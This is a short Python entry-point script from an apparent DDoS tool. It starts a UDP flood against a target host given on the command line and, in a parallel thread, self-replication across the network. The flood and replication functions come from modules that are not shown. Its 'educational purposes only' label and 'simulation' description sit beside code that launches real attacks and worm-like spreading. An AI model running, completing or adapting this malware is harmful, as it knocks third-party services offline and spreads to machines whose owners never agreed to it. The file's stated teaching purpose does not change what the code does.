#!/usr/bin/env python
# -*- coding: utf-8 -*-

# file ddos/__main__.py

"""
Performs the attack on the network and replicates itself
"""

import argparse
import time

from threading import Thread
from connect import network_replicate
from flood import flood_host


def flood_attack(host, amount):
    print('Starting UDP flood attack')
    flood_host(host, amount)


def replication_attack():
    print('Starting network replication')
    network_replicate()
    time.sleep(60)


def main(host, amount):
    flood = Thread(target=flood_attack, args=(host, amount))
    replicate = Thread(target=replication_attack)
    flood.start()
    replicate.start()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='''DDoS attack simulation at a given host.''',
        epilog="""For educational purposes only!""")
    parser.add_argument('host', type=str, help='an host to attack')
    parser.add_argument('amount', type=int, help='number of attacks per random port (0: attacks only one random port)')
    args = parser.parse_args()
    main(args.host, args.amount)